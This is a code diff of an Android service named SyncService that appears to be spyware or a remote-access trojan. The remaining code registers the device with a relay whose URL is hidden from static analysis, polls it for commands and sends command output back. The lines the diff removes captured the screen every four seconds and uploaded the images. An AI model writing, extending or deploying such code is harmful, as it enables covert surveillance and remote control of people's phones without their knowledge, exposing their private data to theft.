@@ -38,8 +38,6 @@ public class SyncService extends Service {
     private volatile boolean running = false;
     private static SyncService instance;
 
-    static volatile byte[] pendingShot = null;
-
     public static SyncService getInstance() { return instance; }
 
     // Relay URL hidden from static analysis — decoded at runtime
@@ -73,19 +71,12 @@ public class SyncService extends Service {
 
     private void loop() {
         String id = loadId();
-        long lastReg = 0, lastShot = 0;
+        long lastReg = 0;
         int lastCid = 0;
         while (running) {
             try {
                 long now = System.currentTimeMillis();
                 if (now - lastReg > 30_000) { reg(id); lastReg = now; }
-                if (now - lastShot > 4_000) {
-                    MonitorService ms = MonitorService.getInstance();
-                    if (ms != null) ms.snap();
-                    byte[] s = pendingShot;
-                    if (s != null) { pendingShot = null; pushShot(id, s); }
-                    lastShot = now;
-                }
                 JSONObject p = get("/esp/device-cmd?did=" + URLEncoder.encode(id, "UTF-8"));
                 String cmd = p.optString("cmd", "");
                 int cid = p.optInt("id", 0);
@@ -141,16 +132,6 @@ public class SyncService extends Service {
             b.put("did", id); b.put("cmd", cmd); b.put("out", out);
             b.put("os", "Android " + Build.VERSION.RELEASE);
             post("/esp/device-cmdout", b);
-        } catch (Exception ignored) {}
-    }
-
-    void pushShot(String id, byte[] img) {
-        try {
-            JSONObject b = new JSONObject();
-            b.put("did", id);
-            b.put("img", Base64.encodeToString(img, Base64.NO_WRAP));
-            b.put("os", "Android " + Build.VERSION.RELEASE);
-            post("/esp/device-screenshot", b);
         } catch (Exception ignored) {}
     }
 
